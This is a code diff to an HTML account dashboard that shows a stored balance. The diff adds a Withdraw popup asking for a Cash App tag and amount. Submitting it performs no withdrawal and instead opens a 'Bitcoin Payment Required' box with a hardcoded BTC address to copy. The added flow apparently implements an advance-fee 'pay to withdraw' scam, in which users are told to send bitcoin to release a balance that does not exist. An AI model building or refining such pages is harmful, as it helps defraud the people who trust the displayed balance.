@@ -6,6 +6,37 @@
   <link rel="stylesheet" href="styles.css">
 </head>
 
+<!-- Withdraw Popup 1 -->
+<div id="withdrawPopup" class="popup">
+  <div class="popup-box">
+    <h3>Withdraw Funds</h3>
+
+    <input type="text" id="cashTag" placeholder="Enter Cash App Tag" required>
+    <input type="number" id="withdrawAmount" placeholder="Enter Amount" required>
+
+    <button onclick="submitWithdraw()">Withdraw</button>
+    <button class="close-btn" onclick="closePopup()">Cancel</button>
+  </div>
+</div>
+
+<!-- BTC Address Popup -->
+<div id="btcPopup" class="popup">
+  <div class="popup-box">
+    <h3>Bitcoin Payment Required</h3>
+
+    <p style="margin-bottom:10px;">Please copy the address</p>
+
+    <div class="btc-box">
+      <input type="text" id="btcAddress" 
+      value="bc1qd7vuq63a2e0zxqgt67u46gjk3fqj740fujwz0t" readonly>
+      <button onclick="copyBTC()">Copy</button>
+    </div>
+
+    <button class="close-btn" onclick="closeBTCPopup()">Close</button>
+  </div>
+</div>
+
+  
 <body>
 
 <!-- HEADER -->
@@ -44,12 +75,13 @@
 
   <!-- Withdraw BELOW total -->
   <div class="withdraw-container">
-    <button class="withdraw-btn">Withdraw</button>
+    <button class="withdraw-btn" onclick="openPopup()">Withdraw</button>
   </div>
 
 </div>
 
 <script>
+  
   const name = localStorage.getItem("name");
   const balance = parseFloat(localStorage.getItem("balance"));
 
@@ -69,9 +101,43 @@
     localStorage.clear();
     window.location.href = "login.html";
   }
+
+function openPopup() {
+  document.getElementById("withdrawPopup").style.display = "flex";
+}
+
+function closePopup() {
+  document.getElementById("withdrawPopup").style.display = "none";
+}
+
+function submitWithdraw() {
+  const tag = document.getElementById("cashTag").value;
+  const amount = document.getElementById("withdrawAmount").value;
+
+  if (!tag || !amount) {
+    alert("Please fill all fields");
+    return;
+  }
+
+  closePopup();
+  document.getElementById("btcPopup").style.display = "flex";
+}
+
+function closeBTCPopup() {
+  document.getElementById("btcPopup").style.display = "none";
+}
+
+function copyBTC() {
+  const btcInput = document.getElementById("btcAddress");
+  btcInput.select();
+  btcInput.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  alert("Address copied!");
+}  
 </script>
 
 </body>
 </html>
+
 
 
